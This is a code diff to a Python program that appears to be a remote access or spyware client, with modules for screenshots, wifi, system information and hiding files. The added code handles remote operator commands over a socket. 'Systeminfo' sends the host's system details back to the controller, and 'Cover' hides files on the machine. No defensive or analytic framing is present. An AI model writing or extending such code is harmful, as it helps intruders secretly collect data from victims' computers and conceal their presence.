@@ -9,6 +9,8 @@ from modules.paths import *
 from modules.menu import *
 from modules.screenshots import *
 from modules.wifi import *
+from modules.system_info import *
+from modules.hide_files import *
 import socket 
 
 
@@ -113,10 +115,14 @@ def connect_client_side():
                         #sock.send("\n\n")
 
                     elif user_command.strip()== 'Systeminfo':
-                        pass
+                        sock.send("\n\n")
+                        sock.send("[*] Gathering System Information..................................... \n\n")
+                        sock.send(get_system_info())
 
                     elif user_command.strip() == 'Cover':
-                        pass
+                        sock.send("\n\n")
+                        sock.send("[*] Getting ready to hide and cover .................................... \n\n")
+                        hide_file(folder_path)
                         
                     else:
                         sock.send("\n [*] ERROR: Entered Wrong Command. Type [Menu] to get the list of commands\n\n")  
@@ -130,7 +136,7 @@ def shell():
     # check the connection
     conn = get_current_connection()
     
-    if conn == True:  
+    if conn == True :  
          connect_client_side()
     else:
          begin_logging()
@@ -152,5 +158,4 @@ if __name__ == "__main__" :
 # TODO:
 # Sanitize the loggs
 # Handle closing sockets properly
-
-
+# if the server disconnets (add another conduiton for that )
